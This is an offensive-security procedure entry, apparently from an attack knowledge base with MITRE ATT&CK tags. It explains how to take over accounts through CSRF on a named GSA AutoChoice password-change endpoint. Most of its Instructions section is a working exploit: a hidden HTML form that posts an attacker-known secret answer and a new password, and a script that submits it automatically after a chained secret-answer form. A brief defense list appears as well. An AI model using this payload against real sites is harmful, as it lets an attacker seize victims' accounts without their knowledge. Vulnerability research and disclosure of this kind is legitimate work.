---
tags:
  - csrf
  - password-change
  - okta
  - web
type: procedure
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:33:12.420Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 71d12cbb-64c4-4d43-b711-86bce33e03ee
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# CSRF-Change-Password-Using-New-Answer

## Summary

This procedure exploits the lack of CSRF protection on the password change endpoint, using a pre-set secret answer to unauthorizedly reset the victim's password, achieving full account takeover.

## Description

Following the secret answer update, this targets https://autochoice.fas.gsa.gov/AutoChoice/changePwOktaAnswer, which validates the provided answer against the current one but lacks CSRF checks. The malicious HTML form includes the new answer and desired password, submitted automatically after a delay. This leverages the victim's active session for authentication, completing the takeover without further interaction.

## Requirements

1. Updated secret answer from prior step
2. Desired new password values
3. Victim's browser session active

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens and validate on all authenticated POSTs
- Require re-authentication or CAPTCHA for sensitive changes like password resets
- Audit logs for password changes without corresponding user activity

## Objectives

1. Gain persistent access to the victim's account
2. Complete the account takeover chain
3. Enable post-exploitation actions like data exfiltration

## Instructions

### Step 1: Craft Second HTML Form

**Context**: Build a form for the password endpoint using the known new answer.

Add to the HTML PoC:

```html
<form id="changePW" action="https://autochoice.fas.gsa.gov/AutoChoice/changePwOktaAnswer" method="POST">
  <input type="hidden" name="answer" value="attacker_knows_this">
  <input type="hidden" name="newPassword" value="new_secure_password123">
  <input type="hidden" name="confirmPassword" value="new_secure_password123">
</form>
```

> Hidden fields ensure silent submission; match answer to Step 1 output.

### Step 2: Integrate and Trigger After Delay

**Context**: Chain with prior form using timeout for propagation.

Update script:

```html
<script>
document.getElementById('updateQA').submit();
setTimeout(function() {
  document.getElementById('changePW').submit();
}, 3000);
</script>
```

> Deliver the full PoC; confirm via login test with new password.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- csrf
- account-takeover
